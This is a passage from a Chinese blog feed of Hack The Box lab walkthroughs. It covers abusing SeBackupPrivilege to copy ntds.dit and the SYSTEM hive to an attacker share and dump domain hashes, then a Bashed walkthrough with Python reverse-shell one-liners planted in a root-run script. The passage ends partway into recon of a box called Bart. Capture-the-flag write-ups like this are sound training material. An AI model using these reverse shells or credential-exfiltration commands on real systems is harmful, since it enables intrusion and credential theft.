class="hljs-number">40</span> AM<br>   <span class="hljs-keyword">Source</span> : z:\windows\ntds\<br>     Dest : Z:\<br><br>    Files : ntds.dit<br><br>  <span class="hljs-keyword">Options</span> : <span class="hljs-regexp">/DCOPY:DA /</span><span class="hljs-keyword">COPY</span>:DAT <span class="hljs-regexp">/B /</span>R:<span class="hljs-number">1000000</span> /W:<span class="hljs-number">30</span><br><br>------------------------------------------------------------------------------<br><br>                           <span class="hljs-number">1</span>    z:\windows\ntds\<br><span class="hljs-number">2022</span><span class="hljs-regexp">/04/</span><span class="hljs-number">23</span> <span class="hljs-number">06</span>:<span class="hljs-number">56</span>:<span class="hljs-number">40</span> ERROR <span class="hljs-number">19</span> (<span class="hljs-number">0</span>x00000013) Accessing Destination Directory Z:\<br>The media is <span class="hljs-keyword">write</span> <span class="hljs-keyword">protected</span>.<br><br>Waiting <span class="hljs-number">30</span> seconds... Retrying...<br><span class="hljs-number">2022</span><span class="hljs-regexp">/04/</span><span class="hljs-number">23</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">10</span> ERROR <span class="hljs-number">19</span> (<span class="hljs-number">0</span>x00000013) Accessing Destination Directory Z:\<br>The media is <span class="hljs-keyword">write</span> <span class="hljs-keyword">protected</span>.<br></code></pre></td></tr></table></figure><p>后来我找到了这个工具：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/giuliano108/</span>SeBackupPrivilege<br></code></pre></td></tr></table></figure><p>它是基于powershell的工具来滥用SeBackupPrivilege权限，根据官方的文档介绍，我需要用到两个dll，我可以通过Evil-WinRM上传，这两个文件在&#x2F;SeBackupPrivilege&#x2F;SeBackupPrivilegeCmdLets&#x2F;bin&#x2F;Debug目录中：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">-[~<span class="hljs-regexp">/…/</span>SeBackupPrivilege<span class="hljs-regexp">/SeBackupPrivilegeCmdLets/</span>bin/Debug]<br>└─$ ls<br>SeBackupPrivilegeCmdLets.dll  SeBackupPrivilegeUtils.dll<br>$ cp * ~<br></code></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">*Evil-WinRM* PS C:\temp&gt; upload <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SeBackupPrivilegeCmdLets</span>.</span></span>dll<br>Info: Uploading <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SeBackupPrivilegeCmdLets</span>.</span></span>dll <span class="hljs-keyword">to</span> C:\temp\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SeBackupPrivilegeCmdLets</span>.</span></span>dll<br><br>                                                             <br>Data: <span class="hljs-number">16384</span> <span class="hljs-built_in">bytes</span> <span class="hljs-keyword">of</span> <span class="hljs-number">16384</span> <span class="hljs-built_in">bytes</span> copied<br><br>Info: Upload successful!<br><br>*Evil-WinRM* PS C:\temp&gt; upload <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SeBackupPrivilegeUtils</span>.</span></span>dll<br>Info: Uploading <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SeBackupPrivilegeUtils</span>.</span></span>dll <span class="hljs-keyword">to</span> C:\temp\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SeBackupPrivilegeUtils</span>.</span></span>dll<br><br>                                                             <br>Data: <span class="hljs-number">21844</span> <span class="hljs-built_in">bytes</span> <span class="hljs-keyword">of</span> <span class="hljs-number">21844</span> <span class="hljs-built_in">bytes</span> copied<br><br>Info: Upload successful!<br><br>*Evil-WinRM* PS C:\temp&gt; <br></code></pre></td></tr></table></figure><p>然后将其导入到当前会话中：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-operator">*</span><span class="hljs-variable">Evil</span><span class="hljs-operator">-</span><span class="hljs-variable">WinRM</span><span class="hljs-operator">*</span> <span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">temp</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">SeBackupPrivilegeUtils</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-operator">*</span><span class="hljs-variable">Evil</span><span class="hljs-operator">-</span><span class="hljs-variable">WinRM</span><span class="hljs-operator">*</span> <span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">temp</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">SeBackupPrivilegeCmdLets</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-operator">*</span><span class="hljs-variable">Evil</span><span class="hljs-operator">-</span><span class="hljs-variable">WinRM</span><span class="hljs-operator">*</span> <span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">temp</span><span class="hljs-operator">&gt;</span> <br></code></pre></td></tr></table></figure><p>这样我就可以将ntds.dit转存到我本地，可能文件很大，需要的时间很长。：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">*Evil-WinRM* PS C:<span class="hljs-symbol">\t</span>emp&gt; Copy-FileSeBackupPrivilege z:\Windows<span class="hljs-symbol">\n</span>tds<span class="hljs-symbol">\n</span>tds.dit <span class="hljs-symbol">\\</span>10.10.16.12\share<span class="hljs-symbol">\n</span>tds.dit<br></code></pre></td></tr></table></figure><p>还需要ntds.dit解密密钥，位于注册表HKLM\SYSTEM中，虽然也慢，但还好：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">*Evil-WinRM* PS C:\<span class="hljs-keyword">temp</span>&gt; reg.exe save hklm\<span class="hljs-keyword">system</span> \\<span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.12</span>\<span class="hljs-keyword">share</span>\<span class="hljs-keyword">system</span><br>The operation completed successfully.<br></code></pre></td></tr></table></figure><p>然后我可以通过Impacket 的 secretsdump提取哈希：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>./toolbox/posttool/impacket<span class="hljs-number">-0.9</span>.<span class="hljs-number">24</span>/examples/secretsdump.py -system system -ntds ntds.dit <span class="hljs-title class_">LOCAL</span><br><span class="hljs-title class_">Impacket</span> v0.<span class="hljs-number">9.24</span> - <span class="hljs-title class_">Copyright</span> <span class="hljs-number">2021</span> <span class="hljs-title class_">SecureAuth</span> <span class="hljs-title class_">Corporation</span><br><br>[*] <span class="hljs-title class_">Target</span> system <span class="hljs-symbol">bootKey:</span> <span class="hljs-number">0x73d83e56de8961ca9f243e1a49638393</span><br>[*] <span class="hljs-title class_">Dumping</span> <span class="hljs-title class_">Domain</span> <span class="hljs-title class_">Credentials</span> (domain\<span class="hljs-symbol">uid:</span><span class="hljs-symbol">rid:</span><span class="hljs-symbol">lmhash:</span>nthash)<br>[*] <span class="hljs-title class_">Searching</span> <span class="hljs-keyword">for</span> pekList, be patient<br>[*] <span class="hljs-title class_">PEK</span> <span class="hljs-comment"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span><br>[*] <span class="hljs-title class_">Reading</span> <span class="hljs-keyword">and</span> decrypting hashes from ntds.dit<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">184</span>fb5e5178480be64824d4cd53b99ee:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br><span class="hljs-title class_">DC01</span><span class="hljs-variable">$:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">65557</span>f7ad03ac340a7eb12b9462f80d6:::<br><span class="hljs-symbol">krbtgt:</span><span class="hljs-number">502</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:d3c02561bba6ee4ad6cfd024ec8fda5d</span>:::<br><span class="hljs-symbol">audit2020:</span><span class="hljs-number">1103</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:c95ac94a048e7c29ac4b4320d7c9d3b5</span>:::<br><span class="hljs-symbol">support:</span><span class="hljs-number">1104</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:cead107bf11ebc28b3e6e90cde6de212</span>::<span class="hljs-symbol">:</span><br></code></pre></td></tr></table></figure><h4 id="拥有了root-txt："><a href="#拥有了root-txt：" class="headerlink" title="拥有了root.txt："></a>拥有了root.txt：</h4><p>这样我就可以pth移动到目标机器中，或者evil-winrm以哈希链接都可以，但是我选择后者，因为它提到过root.txt被加密了，如果涉及到一些文件相关的操作，evil-winrm会更好，但我觉得我被骗了，因为root.txt根本没加密：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">*Evil-WinRM* PS <span class="hljs-name">C</span>:\Users\Administrator&gt; cd desktop<br>*Evil-WinRM* PS <span class="hljs-name">C</span>:\Users\Administrator\desktop&gt; dir<br><br><br>    <span class="hljs-name">Directory</span>: <span class="hljs-name">C</span>:\Users\Administrator\desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-comment">----                -------------         ------ ----</span><br>-a<span class="hljs-comment">----        2/28/2020   4:36 PM            447 notes.txt</span><br>-a<span class="hljs-comment">----        11/5/2020   8:38 PM             32 root.txt</span><br><br><br>*Evil-WinRM* PS <span class="hljs-name">C</span>:\Users\Administrator\desktop&gt; <span class="hljs-built_in">type</span> root.txt<br></code></pre></td></tr></table></figure><p>又或者被其他同僚捷足先登了也有可能，因为我捕获到了他的痕迹：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">*Evil-WinRM* PS C:\<span class="hljs-keyword">temp</span>&gt; net use<br><span class="hljs-built_in">New</span> connections will be remembered.<br><br><br>Status       <span class="hljs-keyword">Local</span>     Remote                    Network<br><br><span class="hljs-comment">-------------------------------------------------------------------------------</span><br>Unavailable  H:        \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.4</span>\blackfieldA  Microsoft Windows Network<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\<span class="hljs-keyword">temp</span>&gt; <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Bashed</title>
    <link href="/post/HackTheBox-Bashed.html"/>
    <url>/post/HackTheBox-Bashed.html</url>
    
    <content type="html"><![CDATA[<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-18 15:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> bashed.htb (10.10.10.68)<br>Host is up (0.20s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Arrexel<span class="hljs-string">&#x27;s Development Site</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 18.69 seconds</span><br></code></pre></td></tr></table></figure><p>一个phpbash介绍页面，都是假按钮：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518152106768.png" alt="image-20220518152106768"  /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; dirsearch -u http://bashed.htb -e php<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 8940<br><br>Output File: /home/mosaictheory/.dirsearch/reports/bashed.htb/_22-05-18_15-18-52.txt<br><br>Error Log: /home/mosaictheory/.dirsearch/logs/errors-22-05-18_15-18-52.<span class="hljs-built_in">log</span><br><br>Target: http://bashed.htb/<br>[15:18:55] 301 -  306B  - /php  -&gt;  http://bashed.htb/php/<br>[15:19:41] 200 -    0B  - /config.php<br>[15:19:43] 301 -  306B  - /css  -&gt;  http://bashed.htb/css/<br>[15:19:45] 301 -  306B  - /dev  -&gt;  http://bashed.htb/dev/<br>[15:19:45] 200 -    1KB - /dev/<br>[15:19:49] 301 -  308B  - /fonts  -&gt;  http://bashed.htb/fonts/<br>[15:19:52] 301 -  309B  - /images  -&gt;  http://bashed.htb/images/<br>[15:19:52] 200 -    2KB - /images/<br>[15:19:52] 200 -    8KB - /index.html<br>[15:19:54] 301 -  305B  - /js  -&gt;  http://bashed.htb/js/<br>[15:19:54] 200 -    3KB - /js/<br>[15:20:03] 200 -  938B  - /php/<br>[15:20:09] 403 -  298B  - /server-status<br>[15:20:09] 403 -  299B  - /server-status/<br>[15:20:18] 301 -  310B  - /uploads  -&gt;  http://bashed.htb/uploads/<br>[15:20:18] 200 -   14B  - /uploads/<br></code></pre></td></tr></table></figure><p>在dev目录下会有一个phpbash.php:</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518152239786.png" alt="image-20220518152239786"  /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@bashed<br>:/<span class="hljs-comment"># cd /home</span><br>www-data@bashed<br>:/home<span class="hljs-comment"># ls</span><br>arrexel<br>scriptmanager<br>www-data@bashed<br>:/home<span class="hljs-comment"># cd arrexel</span><br>www-data@bashed<br>:/home/arrexel<span class="hljs-comment"># ls</span><br>user.txt<br>www-data@bashed<br>:/home/arrexel<span class="hljs-comment"># cat user.txt</span><br>2c.............................<br>www-data@bashed<br>:/home/arrexel<span class="hljs-comment"># sudo -l</span><br>Matching Defaults entries <span class="hljs-keyword">for</span> www-data on bashed:<br>env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br>User www-data may run the following commands on bashed:<br>(scriptmanager : scriptmanager) NOPASSWD: ALL<br></code></pre></td></tr></table></figure><p>这个shell无法运行一些正常shell的命令，可以反弹shell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.7&quot;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure><p>可以切换到scriptmanager用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -u scriptmanager /bin/bash<br></code></pre></td></tr></table></figure><p>这次sudo要密码，但我没有：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">scriptmanager@bashed:/home/arrexel$ <span class="hljs-built_in">ls</span><br>user.txt<br>scriptmanager@bashed:/home/arrexel$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> scriptmanager: <br></code></pre></td></tr></table></figure><p>在根目录下有个script目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">scriptmanager@bashed:/scripts$ <span class="hljs-built_in">ls</span><br>test.py  test.txt<br>scriptmanager@bashed:/scripts$ <span class="hljs-built_in">cat</span> <span class="hljs-built_in">test</span>.<br><span class="hljs-built_in">cat</span>: <span class="hljs-built_in">test</span>.: No such file or directory<br>scriptmanager@bashed:/scripts$ <span class="hljs-built_in">cat</span> test.txt <br>testing 123!scriptmanager@bashed:/scripts$ <br>scriptmanager@bashed:/scripts$ <span class="hljs-built_in">cat</span> test.py <br>f = open(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>f.write(<span class="hljs-string">&quot;testing 123!&quot;</span>)<br>f.close<br>scriptmanager@bashed:/scripts$ <br></code></pre></td></tr></table></figure><p>似乎test.txt是test.py的产物，而我对他有读写权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">scriptmanager@bashed:/scripts$ <span class="hljs-built_in">ls</span> -all<br>total 16<br>drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .<br>drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..<br>-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py<br>-rw-r--r--  1 root          root            12 May 18 00:36 test.txt<br>scriptmanager@bashed:/scripts$ <br></code></pre></td></tr></table></figure><p>似乎是有个东西在运行它，而我计划任务中没有看到，但是我把test.txt重新命名的话，过一会儿又会生成出一个新的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">scriptmanager@bashed:/scripts$ <span class="hljs-built_in">ls</span><br>test.py  test.txt<br>scriptmanager@bashed:/scripts$ <span class="hljs-built_in">mv</span> test.txt test.txt.old <br>scriptmanager@bashed:/scripts$ <span class="hljs-built_in">ls</span><br>test.py  test.txt  test.txt.old<br></code></pre></td></tr></table></figure><p>我可以在当前目录存放一个python反弹shell的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">echo <span class="hljs-string">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.16.7\&quot;,9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&quot;</span> &gt; test.py<br></code></pre></td></tr></table></figure><p>然后静静等着它执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">─&gt;&gt; nc -lvnp 9002<br>listening on [any] 9002 ...<br>connect to [10.10.16.7] from (UNKNOWN) [10.10.10.68] 37020<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string"># id</span><br><span class="hljs-string">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="hljs-string"># cat /root/root.txt</span><br><span class="hljs-string">cc4.................................</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Bart</title>
    <link href="/post/HackTheBox-Bart.html"/>
    <url>/post/HackTheBox-Bart.html</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -sC -Pn -p- -T4 10.10.10.81<br></code></pre></td></tr></table></figure><p>偶尔就会像这样，我扫了全端口而Nmap只为我枚举出了80HTTP端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.81<br>Host is up (0.38s latency).<br>Not shown: 65534 filtered tcp ports (no-response)<br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Microsoft IIS httpd 10.0<br>|_http-title: Did not follow redirect to http://forum.bart.htb/<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-trane-info: Problem with XML parsing of /evox/about<br>|_http-server-header: Microsoft-IIS/10.0<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 640.80 seconds<br></code></pre></td></tr></table></figure><p>但是我不想再扫一遍，那样又会花费很多时间，如果我边扫边对80端口进行访问，那么Nmap扫描端口又会占用大量带宽，致使我访问80端口也不会很流畅，而且我会因为访问80端口占用掉部分带宽，还可能会影响到Nmap发包收包过程中丢包而再次产生误报。所以我决定在我一筹莫展之际，再对目标进行端口探测。不过好在当下Nmap还是告诉了我一些我可用的 信息，例如标志性的Microsoft IIS httpd 10.0，目标是windows操作系统，服务组件为IIS httpd 10.0，它的域名是<strong>forum.bart.htb</strong>，它是一个子域名，它应该拥有应该父域名为bart.htb，我需要将其添加到&#x2F;etc&#x2F;hosts中，首先我尝试搜寻Microsoft IIS httpd 10.0已披露的漏洞：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> IIS <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220404233938790.png" alt="image-20220404233938790"  /><p>它并没有为我提供一些有帮助的信息。所以我打开了浏览器访问了目标页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220404235240144.png" alt="image-20220404235240144"  /><p>它的页面为我提供了很多按钮可以进行点击，但都只是跳转到当前的页面的锚点，并不会与服务器发生产生任何请求，当然我可以将标签中对应的锚点替换为我希望读取的目录文件，但它与路径爆破是一样的，而我对URL进行路径爆破会比这样不断的更改跳转方便的多。但我并不准备现在就爆破路径，我觉得做事情有条理会更容易一些。我发现了两个按钮，但是它们一样只是单纯的页面锚点跳转，并不会向服务器发送任何请求：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405135858215.png" alt="image-20220405135858215"  /><p>好的，我在浏览时发现了一些潜藏的用户名信息：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405000215406.png" alt="image-20220405000215406"  /><p>Samantha Brown、Daniel Simmons、Robert Hilton，</p><p>而每个图像又为我提供了四个按钮，然而前三个都是没什么用的，它们会跳转到当前页面对应的锚点，即使我觉得那些锚点信息与它们完全没有任何关系。</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405000413774.png" alt="image-20220405000413774"  /><p>我尝试把三个肖像的M按钮都点击请求了一次，介于每个图片的请求包都一样的，我便只放了一张图用于演示在哪里提取邮箱信息：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405132952232.png" alt="image-20220405132952232"  /><p>就这样，我收集到了三个邮箱地址：</p><ol><li>To：mailto:<a href="mailto:&#x73;&#x2e;&#x62;&#114;&#111;&#119;&#x6e;&#64;&#98;&#97;&#x72;&#116;&#x2e;&#x6c;&#111;&#99;&#97;&#108;">&#x73;&#x2e;&#x62;&#114;&#111;&#119;&#x6e;&#64;&#98;&#97;&#x72;&#116;&#x2e;&#x6c;&#111;&#99;&#97;&#108;</a> </li><li>To：mailto:<a href="mailto:&#x64;&#46;&#115;&#x69;&#x6d;&#x6d;&#111;&#x6e;&#x73;&#x40;&#98;&#x61;&#x72;&#x74;&#46;&#x68;&#x74;&#x62;">&#x64;&#46;&#115;&#x69;&#x6d;&#x6d;&#111;&#x6e;&#x73;&#x40;&#98;&#x61;&#x72;&#x74;&#46;&#x68;&#x74;&#x62;</a> </li><li>To：mailto:<a href="mailto:&#x72;&#46;&#104;&#105;&#108;&#x74;&#x6f;&#110;&#64;&#98;&#x61;&#x72;&#x74;&#46;&#x68;&#x74;&#x62;">&#x72;&#46;&#104;&#105;&#108;&#x74;&#x6f;&#110;&#64;&#98;&#x61;&#x72;&#x74;&#46;&#x68;&#x74;&#x62;</a></li></ol><p>但是我也不知道为何brown的邮箱后缀为local，请原谅我的见识目前还不够，我觉得它像是公司内部自定义的邮箱账号，而它们的邮箱前缀更像是一个用户名：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">brown  simmons  hilton</span><br></code></pre></td></tr></table></figure><p>紧接着我下拉滚动条又发现了一个员工，它又为我提供了一个潜藏的用户名Jane Doe，但是目标并未该员工提供任何我能点击触发的按钮，但是通过对该员工的信息介绍，我知道她是目标的开发部门，或许她会掌管有目标内部环境的配置信息，源代码，项目实施计划方案等等等等，她的账户通常会拥有Web站点更多的权限，她也就成为了我优先选择的目标：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405134858591.png" alt="image-20220405134858591"  /><p>紧接着还有三张图片信息，我可以点击图片，也可以点击图片下方的小标题，但是它们并不会向服务器发送任何请求，而且我点击它们也只是跳转到了页面顶部的锚点：</p><img 